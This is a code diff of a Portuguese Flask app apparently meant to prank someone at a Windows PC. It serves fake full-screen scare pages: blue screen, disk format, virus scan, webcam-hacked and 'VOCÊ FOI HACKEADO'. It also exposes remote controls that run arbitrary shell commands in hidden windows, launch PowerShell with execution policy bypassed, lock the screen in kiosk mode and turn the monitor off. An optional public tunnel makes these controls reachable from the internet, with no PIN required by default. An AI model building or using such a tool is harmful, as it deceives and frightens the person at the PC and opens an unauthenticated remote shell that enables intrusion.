-
-// ----- invert colors toggle -----
 let autoInvert=false;
 function atualizarBotaoInvert(){
   const b=$('#btnInvert');
-  b.textContent = 'Inverter cores: ' + (autoInvert?'ON':'OFF');
-  if(autoInvert){ b.classList.remove('outline'); b.classList.add('on'); }
-  else{ b.classList.add('outline'); b.classList.remove('on'); }
+  b.textContent='Inverter cores: '+(autoInvert?'ON':'OFF');
+  if(autoInvert){b.classList.remove('outline');b.classList.add('on')}
+  else{b.classList.add('outline');b.classList.remove('on')}
 }
 async function toggleInvert(){
-  autoInvert = !autoInvert;
+  autoInvert=!autoInvert;
   await fetch('/api/invert_colors',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ativo:autoInvert})});
   atualizarBotaoInvert();
-  log(autoInvert ? "[+] Invertendo cores ON" : "[+] Invertendo cores OFF");
+  log(autoInvert?"[+] Invertendo cores ON":"[+] Invertendo cores OFF");
 }
-
-// modo lan/wan
-let modoAtual='lan', tunelUrl=null, tunelPoll=null;
+let modoAtual='lan',tunelUrl=null,tunelPoll=null;
 async function carregarModo(){
-  try{
-    const r=await fetch('/api/config'); const j=await r.json();
-    modoAtual=j.modo||'lan'; tunelUrl=j.tunel_url||null;
-    atualizarModoUI();
-    if(modoAtual==='wan' && (!tunelUrl || !tunelUrl.startsWith('http'))) iniciarPollTunel();
+  try{const r=await fetch('/api/config');const j=await r.json();
+    modoAtual=j.modo||'lan';tunelUrl=j.tunel_url||null;atualizarModoUI();
+    if(modoAtual==='wan'&&(!tunelUrl||!tunelUrl.startsWith('http')))iniciarPollTunel();
   }catch(e){}
 }
 function atualizarModoUI(){
-  const bLan=$('#btnModoLan'), bWan=$('#btnModoWan');
-  const box=$('#tunelBox'), st=$('#tunelStatus'), av=$('#wanAviso');
+  const bLan=$('#btnModoLan'),bWan=$('#btnModoWan');
+  const box=$('#tunelBox'),st=$('#tunelStatus'),av=$('#wanAviso');
   if(modoAtual==='lan'){
-    bLan.classList.remove('outline'); bLan.classList.add('on');
-    bWan.classList.add('outline'); bWan.classList.remove('on');
-    box.classList.add('hid'); box.textContent=''; st.textContent=''; av.classList.add('hid');
+    bLan.classList.remove('outline');bLan.classList.add('on');
+    bWan.classList.add('outline');bWan.classList.remove('on');
+    box.classList.add('hid');box.textContent='';st.textContent='';av.classList.add('hid');
   }else{
-    bWan.classList.remove('outline'); bWan.classList.add('on');
-    bLan.classList.add('outline'); bLan.classList.remove('on');
+    bWan.classList.remove('outline');bWan.classList.add('on');
+    bLan.classList.add('outline');bLan.classList.remove('on');
     box.classList.remove('hid');
-    if(tunelUrl && tunelUrl.startsWith('http')){ box.textContent=tunelUrl; st.textContent='Abra em qualquer rede.'; }
-    else{ box.textContent=tunelUrl||'iniciando...'; st.textContent='Aguarde 10-30s.'; }
-    fetch('/api/state').then(r=>r.json()).then(j=>av.classList.toggle('hid', j.pin_set)).catch(()=>{});
+    if(tunelUrl&&tunelUrl.startsWith('http')){box.textContent=tunelUrl;st.textContent='Abra em qualquer rede.'}
+    else{box.textContent=tunelUrl||'iniciando...';st.textContent='Aguarde 10-30s.'}
+    fetch('/api/state').then(r=>r.json()).then(j=>av.classList.toggle('hid',j.pin_set)).catch(()=>{});
   }
 }
 function iniciarPollTunel(){
-  if(tunelPoll) clearInterval(tunelPoll);
+  if(tunelPoll)clearInterval(tunelPoll);
   tunelPoll=setInterval(async()=>{
-    try{
-      const r=await fetch('/api/config'); const j=await r.json();
-      tunelUrl=j.tunel_url; atualizarModoUI();
-      if(tunelUrl && tunelUrl.startsWith('http')){clearInterval(tunelPoll);tunelPoll=null}
+    try{const r=await fetch('/api/config');const j=await r.json();
+      tunelUrl=j.tunel_url;atualizarModoUI();
+      if(tunelUrl&&tunelUrl.startsWith('http')){clearInterval(tunelPoll);tunelPoll=null}
     }catch(e){}
   },1500);
 }
 async function setModo(m){
-  if(m===modoAtual){log("[i] Ja esta em "+m+".");return}
-  if(m==='wan' && !confirm("Ativar acesso publico? Recomendo PIN definido antes.")) return;
+  if(m===modoAtual){log("[i] Já está em "+m+".");return}
+  if(m==='wan'&&!confirm("Ativar acesso público? Recomendo PIN definido antes."))return;
   const r=await fetch('/api/modo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({modo:m})});
   if(r.status===401){mostrarLock();return}
   const j=await r.json();
   if(!r.ok){alert(j.erro||"erro");return}
-  modoAtual=j.modo; tunelUrl=j.tunel_url||null; atualizarModoUI();
-  if(modoAtual==='wan'){ iniciarPollTunel(); log("[+] Modo publico ativo."); }
-  else { log("[+] Modo LAN."); }
+  modoAtual=j.modo;tunelUrl=j.tunel_url||null;atualizarModoUI();
+  if(modoAtual==='wan'){iniciarPollTunel();log("[+] Modo público ativo.")}
+  else{log("[+] Modo LAN.")}
 }
-
 async function carregarEstado(){
-  const r=await fetch('/api/state'); const j=await r.json();
+  const r=await fetch('/api/state');const j=await r.json();
   $("#ipShow").textContent="http://"+j.ip+":"+j.porta;
   $("#pinWarn").classList.toggle("hid",j.pin_set);
-  if(j.pin_set && !j.autenticado){mostrarLock()}else{$("#lockScreen").classList.add("hid")}
-  if(modoAtual==='wan') atualizarModoUI();
+  if(j.pin_set&&!j.autenticado){mostrarLock()}else{$("#lockScreen").classList.add("hid")}
+  if(modoAtual==='wan')atualizarModoUI();
 }
-carregarEstado();
-carregarAuto();
-carregarModo();
-carregarMsg();
-atualizarBotaoInvert();
+carregarEstado();carregarAuto();carregarModo();carregarMsg();atualizarBotaoInvert();
 </script>
 </body>
 </html>
 """
 
-PAGINA_BSOD = """
-<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
-<style>body{background:#0078d7;color:#fff;font-family:'Segoe UI',Arial,sans-serif;height:100vh;margin:0;
-display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;cursor:none}
-h1{font-size:100px;margin:0 0 20px}p{font-size:20px;max-width:650px;line-height:1.6;padding:0 20px}</style>
-</head><body><h1>:(</h1><p>Seu PC encontrou um problema e precisa ser reiniciado.</p></body></html>
-"""
+PAGINA_BSOD = """<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
+<style>html,body{margin:0;height:100%;overflow:hidden}body{background:#0078d7;color:#fff;
+font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;
+flex-direction:column;text-align:center;cursor:none}h1{font-size:100px;margin:0 0 20px}
+p{font-size:20px;max-width:650px;line-height:1.6;padding:0 20px}</style></head>
+<body><h1>:(</h1><p>Seu PC encontrou um problema e precisa ser reiniciado.</p></body></html>"""
 
-PAGINA_MATRIX = """
-<!doctype html><html><head><meta charset="utf-8"><title> </title>
+PAGINA_MATRIX = """<!doctype html><html><head><meta charset="utf-8"><title> </title>
 <style>html,body{margin:0;height:100%;background:#000;overflow:hidden;cursor:none}canvas{display:block}
 .msg{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;pointer-events:none}
-.msg b{font:700 clamp(24px,4vw,56px)/1.1 Consolas,monospace;color:#21ff5a;text-shadow:0 0 12px #21ff5a;background:rgba(0,0,0,.65);padding:8px 18px}</style>
-</head><body><canvas id="c"></canvas><div class="msg"><b>SISTEMA COMPROMETIDO</b></div>
+.msg b{font:700 clamp(24px,4vw,56px)/1.1 Consolas,monospace;color:#21ff5a;text-shadow:0 0 12px #21ff5a;background:rgba(0,0,0,.65);padding:8px 18px}</style></head>
+<body><canvas id="c"></canvas><div class="msg"><b>SISTEMA COMPROMETIDO</b></div>
 <script>
 const c=document.getElementById('c'),x=c.getContext('2d');
 const chars='01ABCDEFXITADASSO#$%&@*+=<>';const tam=18;let cols,gotas;
@@ -943,17 +914,16 @@ setInterval(()=>{x.fillStyle='rgba(0,0,0,.08)';x.fillRect(0,0,c.width,c.height);
 for(let i=0;i<cols;i++){x.fillStyle=Math.random()<.08?'#c58cff':'#21ff5a';
 x.fillText(chars[Math.floor(Math.random()*chars.length)],i*tam,gotas[i]*tam);
 if(gotas[i]*tam>c.height&&Math.random()>.975)gotas[i]=0;gotas[i]++;}},45);
-</script></body></html>
-"""
+</script></body></html>"""
 
-PAGINA_HACKER = """
-<!doctype html><html><head><meta charset="utf-8"><title> </title>
-<style>html,body{margin:0;background:#000;color:#21ff5a;font:18px/1.45 Consolas,monospace;cursor:none}body{padding:18px}
-pre{margin:0;white-space:pre-wrap}.fim{color:#fff;background:#c00;display:inline-block;padding:6px 14px;margin-top:14px;font-weight:700}</style>
-</head><body><pre id="t"></pre>
+PAGINA_HACKER = """<!doctype html><html><head><meta charset="utf-8"><title> </title>
+<style>html,body{margin:0;background:#000;color:#21ff5a;font:18px/1.45 Consolas,monospace;cursor:none;
+overflow:hidden}body{padding:18px}pre{margin:0;white-space:pre-wrap}
+.fim{color:#fff;background:#c00;display:inline-block;padding:6px 14px;margin-top:14px;font-weight:700}</style></head>
+<body><pre id="t"></pre>
 <script>
 const NL=String.fromCharCode(10);
-const etapas=["Escaneando portas","Quebrando firewall","Injetando payload","Descriptografando hashes","Contornando autenticacao","Copiando arquivos","Apagando rastros"];
+const etapas=["Escaneando portas","Quebrando firewall","Injetando payload","Descriptografando hashes","Contornando autenticação","Copiando arquivos","Apagando rastros"];
 const t=document.getElementById('t');
 function hex(n){let s='';for(let k=0;k<n;k++)s+='0123456789abcdef'[Math.floor(Math.random()*16)];return s}
 let i=0;
@@ -962,81 +932,88 @@ window.scrollTo(0,document.body.scrollHeight);
 if(++i<80){setTimeout(linha,40+Math.random()*160)}
 else{const d=document.createElement('div');d.className='fim';d.textContent='ACESSO CONCEDIDO';document.body.appendChild(d);}}
 linha();
-</script></body></html>
-"""
+</script></body></html>"""
 
-PAGINA_UPDATE = """
-<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
-<style>body{margin:0;background:#0a0a0a;color:#fff;font-family:'Segoe UI',sans-serif;height:100vh;
+# Windows Update — sem scrollbar, com acentos
+PAGINA_UPDATE = """<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
+<style>html,body{margin:0;height:100%;overflow:hidden}
+body{background:#0a0a0a;color:#fff;font-family:'Segoe UI',sans-serif;
 display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px;cursor:none}
 h1{font-size:32px;font-weight:400;margin:0}
 .bar{width:min(560px,80vw);height:6px;background:#1e1e1e;border-radius:3px;overflow:hidden}
 .bar i{display:block;height:100%;background:#0078d7;width:0}
-small{opacity:.7;font-size:14px}</style>
-</head><body>
-<h1>Atualizando o Windows</h1>
+small{opacity:.7;font-size:14px}</style></head>
+<body><h1>Atualizando o Windows</h1>
 <div class="bar"><i id="b"></i></div>
-<small id="pct">0% concluido. Nao desligue o computador.</small>
+<small id="pct">0% concluído. Não desligue o computador.</small>
 <script>
 let p=0;const b=document.getElementById('b'),pct=document.getElementById('pct');
-setInterval(()=>{if(p<99){p+=Math.random()*0.6;b.style.width=p+'%';pct.textContent=Math.floor(p)+'% concluido. Nao desligue o computador.'}},320);
-</script></body></html>
-"""
+setInterval(()=>{if(p<99){p+=Math.random()*0.6;b.style.width=p+'%';pct.textContent=Math.floor(p)+'% concluído. Não desligue o computador.'}},320);
+</script></body></html>"""
 
-PAGINA_FORMAT = """
-<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
-<style>body{margin:0;background:#000;color:#fff;font:16px Consolas,monospace;height:100vh;
-display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;cursor:none;padding:20px}
-pre{font-size:14px;line-height:1.5;max-width:800px;min-height:280px}
-.bar{width:min(560px,80vw);height:20px;border:1px solid #fff;padding:2px}
-.bar i{display:block;height:100%;background:#fff;width:0}
-small{opacity:.7}</style>
-</head><body>
-<pre id="t"></pre>
-<div class="bar"><i id="b"></i></div>
-<small id="pct">0% - Nao desligue o computador</small>
+# Formatando disco — tela AZUL estilo Windows Setup
+PAGINA_FORMAT = """<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
+<style>html,body{margin:0;height:100%;overflow:hidden}
+body{background:#003C7A;color:#fff;font-family:'Segoe UI',Tahoma,sans-serif;cursor:none;
+display:flex;align-items:center;justify-content:center}
+.box{width:min(680px,86vw)}
+h1{font-size:22px;font-weight:400;margin:0 0 26px}
+p{font-size:15px;line-height:1.6;margin:0 0 14px}
+.bar{margin-top:22px;height:8px;background:rgba(255,255,255,.18);border-radius:4px;overflow:hidden}
+.bar i{display:block;height:100%;background:#fff;width:0;transition:width .2s linear}
+.pct{margin-top:12px;font-size:13px;opacity:.85}
+</style></head>
+<body>
+<div class="box">
+  <h1>Instalando o Windows</h1>
+  <p>Formatando disco C: (partição principal)...</p>
+  <p id="log">Preparando...</p>
+  <div class="bar"><i id="b"></i></div>
+  <div class="pct" id="pct">0% - Não desligue o computador</div>
+</div>
 <script>
-const t=document.getElementById('t'),b=document.getElementById('b'),pct=document.getElementById('pct');
 const NL=String.fromCharCode(10);
+const logEl=document.getElementById('log'),b=document.getElementById('b'),pct=document.getElementById('pct');
 const etapas=[
- "FORMATANDO DISCO C: ...",
  "Verificando integridade dos setores...",
- "Setor 0x00A1F2 - 1KB formatado",
- "Setor 0x00B3E7 - 4KB formatado",
- "Recuperando tabela de arquivos...",
- "Apagando MFT...",
- "Limpando registro do sistema...",
- "Zero-fill em andamento...",
- "Gravando novos setores de boot...",
+ "Limpando tabela de arquivos (MFT)...",
+ "Zero-fill em andamento no setor 0x00A1F2...",
+ "Zero-fill em andamento no setor 0x00B3E7...",
+ "Recriando setores de boot...",
+ "Aplicando sistema de arquivos NTFS...",
+ "Gravando registro do sistema...",
+ "Preparando para instalação..."
 ];
-let idx=0;
-setInterval(()=>{ if(idx<etapas.length){ t.textContent += etapas[idx]+NL; idx++; t.scrollTop=t.scrollHeight; } else { t.textContent += ".".repeat(Math.floor(Math.random()*4)+1)+NL; t.scrollTop=t.scrollHeight; } }, 700);
+let i=0;
+setInterval(()=>{ logEl.textContent = etapas[i % etapas.length]; i++; }, 1400);
 let p=0;
-setInterval(()=>{ if(p<99){p+=Math.random()*0.3;b.style.width=p+'%';pct.textContent=Math.floor(p)+'% - Nao desligue o computador';} }, 500);
-</script></body></html>
-"""
+setInterval(()=>{ if(p<99){p+=Math.random()*0.35;b.style.width=p+'%';pct.textContent=Math.floor(p)+'% - Não desligue o computador'} }, 500);
+</script></body></html>"""
 
-PAGINA_SCANNER = """
-<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
-<style>body{margin:0;background:#0a0a0f;color:#e9e9f0;font-family:'Segoe UI',sans-serif;height:100vh;
-display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;cursor:none;padding:20px}
+# Scanner de vírus — mais rápido, sem scrollbar
+PAGINA_SCANNER = """<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
+<style>html,body{margin:0;height:100%;overflow:hidden}
+body{background:#0a0a0f;color:#e9e9f0;font-family:'Segoe UI',sans-serif;cursor:none;
+display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;padding:20px}
 h1{margin:0;font-size:28px;font-weight:600;letter-spacing:1px}
 h1 b{color:#e03030}
-.files{font:13px Consolas,monospace;max-width:900px;height:220px;overflow:hidden;background:#000;border:1px solid #222;border-radius:8px;padding:10px;width:min(900px,90vw)}
-.files div{line-height:1.5}
+.files{font:13px Consolas,monospace;width:min(900px,90vw);height:220px;overflow:hidden;
+background:#000;border:1px solid #222;border-radius:8px;padding:10px}
+.files div{line-height:1.5;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .files .bad{color:#ff5555}
 .bar{width:min(800px,90vw);height:10px;background:#1a1a20;border-radius:5px;overflow:hidden;border:1px solid #222}
 .bar i{display:block;height:100%;background:linear-gradient(90deg,#e03030,#ff8888);width:0}
 .info{display:flex;gap:30px;font:14px Consolas,monospace;color:#9a9aa8}
 .info b{color:#ff5555;font-size:20px;display:block}
-</style></head><body>
-<h1>⚠ SCANNING FOR <b>THREATS</b> ⚠</h1>
+</style></head>
+<body>
+<h1>⚠ VERIFICANDO AMEAÇAS ⚠</h1>
 <div class="files" id="files"></div>
 <div class="bar"><i id="b"></i></div>
 <div class="info">
   <div>Arquivos: <b id="n">0</b></div>
   <div>Infectados: <b id="m">0</b></div>
-  <div>Status: <b id="st">Rodando</b></div>
+  <div>Status: <b id="st">Verificando</b></div>
 </div>
 <script>
 const files=document.getElementById('files'),b=document.getElementById('b');
@@ -1045,40 +1022,33 @@ const nomes=["svch0st.exe","system32.dll.bak","winlogin.exe","_hidden_lol.exe","
  "cookies.db","bitcoin_wallet.dat","fotos_privadas.zip","chrome_passwords.dll","cryptolocker.exe",
  "trojan_x86.sys","rootkit_v3.bin","keylogger.dll","ransom.note.txt","bootsec_bkp.mbr"];
 let total=0, infect=0, p=0;
-function bad(){return Math.random()<0.35}
 setInterval(()=>{
-  const f = nomes[Math.floor(Math.random()*nomes.length)];
-  const path = "C:\\\\Users\\\\User\\\\"+f;
-  const isBad = bad();
+  const f=nomes[Math.floor(Math.random()*nomes.length)];
+  const isBad=Math.random()<0.35;
   total++; if(isBad) infect++;
   const d=document.createElement('div');
-  d.className = isBad?'bad':'';
-  d.textContent = (isBad?'[THREAT] ':'[OK] ')+path;
+  d.className=isBad?'bad':''; d.textContent=(isBad?'[AMEAÇA] ':'[OK] ')+"C:\\\\Users\\\\User\\\\"+f;
   files.prepend(d);
   if(files.children.length>15) files.removeChild(files.lastChild);
-  nEl.textContent = total;
-  mEl.textContent = infect;
-  if(p<99){p+=Math.random()*0.4;b.style.width=p+'%'}
-  if(infect>20) stEl.textContent="CRITICO";
-  else if(infect>5) stEl.textContent="ALTO";
-}, 120);
+  nEl.textContent=total; mEl.textContent=infect;
+  if(p<99){p+=Math.random()*1.2;b.style.width=p+'%'}
+  if(infect>20) stEl.textContent="CRÍTICO"; else if(infect>5) stEl.textContent="ALTO";
+}, 55);
 try{
   const ctx=new (window.AudioContext||window.webkitAudioContext)();
-  setInterval(()=>{
-    if(ctx.state==='suspended') return;
-    const o=ctx.createOscillator();const g=ctx.createGain();
-    o.connect(g);g.connect(ctx.destination);
-    o.type='square';o.frequency.value=Math.random()<.5?220:440;g.gain.value=0.02;
-    o.start();setTimeout(()=>{try{o.stop();}catch(e){}},80);
+  setInterval(()=>{ if(ctx.state==='suspended')return;
+    const o=ctx.createOscillator(),g=ctx.createGain();
+    o.connect(g);g.connect(ctx.destination);o.type='square';
+    o.frequency.value=Math.random()<.5?220:440;g.gain.value=0.02;
+    o.start();setTimeout(()=>{try{o.stop()}catch(e){}},80);
   }, 700);
 }catch(e){}
-</script></body></html>
-"""
+</script></body></html>"""
 
-PAGINA_CAMERA = """
-<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
-<style>body{margin:0;background:#000;color:#f00;font-family:Consolas,monospace;height:100vh;
-display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;cursor:none;padding:20px;text-align:center}
+PAGINA_CAMERA = """<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
+<style>html,body{margin:0;height:100%;overflow:hidden}
+body{background:#000;color:#f00;font-family:Consolas,monospace;cursor:none;
+display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;padding:20px;text-align:center}
 .rec{position:fixed;top:20px;right:20px;display:flex;align-items:center;gap:8px;font-size:20px;color:#fff;
 background:rgba(0,0,0,.6);padding:6px 14px;border-radius:6px;border:1px solid #f00}
 .dot{width:14px;height:14px;background:#f00;border-radius:50%;animation:pulse 1s infinite}
@@ -1086,28 +1056,32 @@ background:rgba(0,0,0,.6);padding:6px 14px;border-radius:6px;border:1px solid #f
 h1{font-size:clamp(32px,7vw,80px);margin:0;text-shadow:0 0 20px #f00;letter-spacing:4px}
 p{font-size:22px;max-width:700px;line-height:1.5;margin:0}
 .cam{border:2px solid #f00;padding:12px 24px;margin-top:10px;font-size:16px;background:rgba(255,0,0,.08)}
-.cam span{color:#fff}</style>
-</head><body>
-<div class="rec"><div class="dot"></div>REC ● LIVE</div>
-<h1>⚠ CAMERA ATIVADA ⚠</h1>
+.cam span{color:#fff}</style></head>
+<body><div class="rec"><div class="dot"></div>REC ● LIVE</div>
+<h1>⚠ CÂMERA ATIVADA ⚠</h1>
 <p>Sua webcam foi acessada remotamente.</p>
 <p class="cam">IP do invasor: <span>192.168.0.666</span> | Porta: <span>4444</span> | Stream: <span>ATIVO</span></p>
 <p style="color:#888;font-size:14px;margin-top:20px">Aguarde... enviando captura para o servidor...</p>
 <script>
-function beep(f,d){
-  try{
-    const ctx=new (window.AudioContext||window.webkitAudioContext)();
-    const o=ctx.createOscillator(),g=ctx.createGain();
-    o.connect(g);g.connect(ctx.destination);
-    o.type='square';o.frequency.value=f;g.gain.value=0.08;
-    o.start();setTimeout(()=>{try{o.stop();ctx.close()}catch(e){}},d);
-  }catch(e){}
-}
-beep(880,250);
-setInterval(()=>beep(880,180), 900);
-setInterval(()=>beep(1320,120), 900+450);
-</script></body></html>
-"""
+function beep(f,d){try{const ctx=new (window.AudioContext||window.webkitAudioContext)();
+const o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);
+o.type='square';o.frequency.value=f;g.gain.value=0.08;o.start();
+setTimeout(()=>{try{o.stop();ctx.close()}catch(e){}},d);}catch(e){}}
+beep(880,250);setInterval(()=>beep(880,180),900);setInterval(()=>beep(1320,120),1350);
+</script></body></html>"""
+
+# Wallpaper troll — overlay em tela cheia (funciona com Wallpaper Engine)
+PAGINA_WALLPAPER = """<!doctype html><html lang="pt-br"><head><meta charset="utf-8"><title> </title>
+<style>html,body{margin:0;height:100%;overflow:hidden;background:#0a0a0f;cursor:none}
+.wrap{width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px}
+h1{font-size:clamp(40px,10vw,180px);font-weight:900;letter-spacing:4px;margin:0;
+color:#f0f;text-shadow:0 0 40px #f0f;font-family:system-ui,sans-serif;text-align:center;padding:0 20px}
+h2{font-size:clamp(20px,4vw,60px);color:#9a3cff;margin:0;letter-spacing:8px;font-family:system-ui,sans-serif}
+p{color:#666;font-size:14px;font-family:monospace;margin-top:40px}
+</style></head><body><div class="wrap">
+<h1>VOCÊ FOI HACKEADO</h1><h2>XITADASSO</h2>
+<p>Sistema comprometido</p>
+</div></body></html>"""
 
 
 @app.route("/")
@@ -1126,6 +1100,8 @@ def formt(): return PAGINA_FORMAT
 def scanner(): return PAGINA_SCANNER
 @app.route("/camera")
 def camera(): return PAGINA_CAMERA
+@app.route("/wallpaper")
+def wallpaper_page(): return PAGINA_WALLPAPER
 
 
 @app.route("/logo.png")
@@ -1135,7 +1111,6 @@ def logo():
 
 
 # ---------- APIs base ----------
-
 @app.route("/api/state")
 def api_state():
     return jsonify(ip=ip_local(), porta=5000, pin_set=bool(ESTADO["pin"]),
@@ -1153,9 +1128,9 @@ def api_config_get():
 def api_config_post():
     b = exigir_auth()
     if b: return b
-    dados = request.get_json(force=True) or {}
-    if "msg_padrao" in dados:
-        ESTADO["msg_padrao"] = (dados.get("msg_padrao") or "")[:200] or CONFIG_PADRAO["msg_padrao"]
+    d = request.get_json(force=True) or {}
+    if "msg_padrao" in d:
+        ESTADO["msg_padrao"] = (d.get("msg_padrao") or "")[:200] or CONFIG_PADRAO["msg_padrao"]
     salvar_config()
     return jsonify(ok=True, msg_padrao=ESTADO["msg_padrao"])
 
@@ -1167,12 +1142,9 @@ def api_modo():
     modo = (request.get_json(force=True) or {}).get("modo")
     if modo not in ("lan", "wan"):
         return jsonify(erro="modo invalido"), 400
-    ESTADO["modo"] = modo
-    salvar_config()
-    if modo == "wan":
-        iniciar_tunel_async()
-    else:
-        parar_tunel()
+    ESTADO["modo"] = modo; salvar_config()
+    if modo == "wan": iniciar_tunel_async()
+    else: parar_tunel()
     return jsonify(ok=True, modo=modo, tunel_url=TUNEL["url"], tunel_ativo=bool(TUNEL["ativo"]))
 
 
@@ -1180,8 +1152,7 @@ def api_modo():
 def api_login():
     pin = request.get_json(force=True).get("pin", "")
     if not ESTADO["pin"] or pin == ESTADO["pin"]:
-        session["ok"] = True
-        return jsonify(ok=True)
+        session["ok"] = True; return jsonify(ok=True)
     return jsonify(erro="pin incorreto"), 401
 
 
@@ -1190,8 +1161,7 @@ def api_pin():
     b = exigir_auth()
     if b: return b
     pin = (request.get_json(force=True).get("pin") or "").strip()
-    ESTADO["pin"] = pin or None
-    salvar_config()
+    ESTADO["pin"] = pin or None; salvar_config()
     return jsonify(ok=True)
 
 
@@ -1208,17 +1178,13 @@ def api_autostart_post():
 
 
 # ---------- acoes rapidas ----------
-
 @app.route("/api/terminal_hacker", methods=["POST"])
 def api_terminal_hacker():
     b = exigir_auth()
     if b: return b
     etapas = ["Escaneando portas", "Quebrando firewall", "Injetando payload",
-              "Descriptografando hashes", "Contornando autenticacao", "Apagando rastros"]
-    linhas = []
-    for e in etapas:
-        lixo = "".join(random.choices(string.hexdigits.lower(), k=32))
-        linhas.append(f"[+] {e}... {lixo} OK")
+              "Descriptografando hashes", "Contornando autenticação", "Apagando rastros"]
+    linhas = [f"[+] {e}... {''.join(random.choices(string.hexdigits.lower(), k=32))} OK" for e in etapas]
     linhas.append("ACESSO CONCEDIDO (brincadeira, nada foi hackeado)")
     return jsonify(saida="\n".join(linhas))
 
@@ -1239,10 +1205,10 @@ def api_abrir_abas():
 def api_monitor_off():
     b = exigir_auth()
     if b: return b
-    def desligar():
+    def w():
         time.sleep(0.5)
         ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
-    threading.Thread(target=desligar, daemon=True).start()
+    threading.Thread(target=w, daemon=True).start()
     return jsonify(saida="Monitor vai apagar.")
 
 
@@ -1288,8 +1254,7 @@ def api_shell():
                                 encoding="cp850" if os.name == "nt" else None, errors="replace",
                                 creationflags=CREATE_NO_WINDOW)
         if cid: COMANDOS_RODANDO[cid] = proc
-        try:
-            out, err = proc.communicate(timeout=60)
+        try: out, err = proc.communicate(timeout=60)
         finally:
             if cid: COMANDOS_RODANDO.pop(cid, None)
         saida = (out or "") + (err or "")
@@ -1309,8 +1274,7 @@ def api_shell_cancelar():
     cid = request.get_json(force=True).get("id")
     proc = COMANDOS_RODANDO.get(cid)
     if not proc: return jsonify(saida="nada para cancelar")
-    try:
-        executar(["taskkill", "/PID", str(proc.pid), "/T", "/F"], capture_output=True)
+    try: executar(["taskkill","/PID",str(proc.pid),"/T","/F"], capture_output=True)
     except Exception:
         try: proc.kill()
         except Exception: pass
@@ -1319,12 +1283,12 @@ def api_shell_cancelar():
 
 # ---------- efeitos de brincadeira ----------
 ESPECIAIS_SENDKEYS = {"+":"{+}","^":"{^}","%":"{%}","~":"{~}","(":"{(}",")":"{)}",
-                     "{":"{{}","}":"{}}","[":"{[}","]":"{]}",}
+                     "{":"{{}","}":"{}}","[":"{[}","]":"{]}"}
 
 
 def gerar_script_notepad():
-    linhas = ["> iniciando sequencia de acesso...", "[+] escaneando rede local...",
-              "[+] contornando firewall...", "[+] acesso concedido!", "", "voce foi hackeado."]
+    linhas = ["> iniciando sequência de acesso...", "[+] escaneando rede local...",
+              "[+] contornando firewall...", "[+] acesso concedido!", "", "você foi hackeado."]
     cmds = ["Add-Type -AssemblyName System.Windows.Forms", "Start-Sleep -Milliseconds 700"]
     for l in linhas:
         for ch in l:
@@ -1345,10 +1309,9 @@ def api_digitar_notepad():
             subprocess.Popen(["notepad.exe"]); time.sleep(1)
             p = os.path.join(tempfile.gettempdir(), "xitadasso_efeito.ps1")
             with open(p, "w", encoding="utf-8") as f: f.write(gerar_script_notepad())
-            executar(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", p],
+            executar(["powershell","-NoProfile","-ExecutionPolicy","Bypass","-File",p],
                      creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0)
-        except Exception as e:
-            log_seguro("erro notepad:", e)
+        except Exception as e: log_seguro("erro notepad:", e)
     threading.Thread(target=w, daemon=True).start()
     return jsonify(saida="Abrindo o Bloco de Notas...")
 
@@ -1365,9 +1328,9 @@ def api_capslock_blink():
     return jsonify(saida="Caps Lock piscando...")
 
 
-# ---------- efeitos em tela cheia ----------
+# ---------- kiosk / tela cheia ----------
 EFEITOS_PC = {"hacker","matrix","bsod","update","format","scanner","camera"}
-KIOSK = {"proc": None}
+KIOSK = {"proc": None, "timer": None}
 PASTA_KIOSK = os.path.join(tempfile.gettempdir(), "xitadasso_kiosk")
 
 
@@ -1382,27 +1345,56 @@ def achar_navegador():
 
 
 def fechar_efeito():
+    if KIOSK.get("timer"):
+        try: KIOSK["timer"].cancel()
+        except Exception: pass
+        KIOSK["timer"] = None
     proc = KIOSK["proc"]; KIOSK["proc"] = None
+    desligar_bloqueio_kiosk()
     if proc is not None:
         try: executar(["taskkill","/PID",str(proc.pid),"/T","/F"], capture_output=True)
         except Exception: pass
     try:
-        executar(["wmic","process","where",f"CommandLine like '%{PASTA_KIOSK}%'","delete"], capture_output=True)
+        executar(["wmic","process","where", f"CommandLine like '%{PASTA_KIOSK}%'","delete"],
+                 capture_output=True)
     except Exception: pass
+    # tambem mata qualquer msedge/chrome aberto com --kiosk
+    for exe in ("msedge.exe", "chrome.exe"):
+        try:
+            executar(["taskkill","/F","/IM",exe,"/FI","WINDOWTITLE eq *XITADASSO*"],
+                     capture_output=True)
+        except Exception: pass
 
 
-def abrir_no_pc(caminho):
+def abrir_no_pc(caminho, segundos=None):
     fechar_efeito()
     url = "http://127.0.0.1:5000" + caminho
     exe = achar_navegador()
     if not exe:
         webbrowser.open(url)
-        return "Abri no navegador padrao (aperte F11)."
+        return "Abri no navegador padrão (F11 para tela cheia)."
     KIOSK["proc"] = subprocess.Popen(
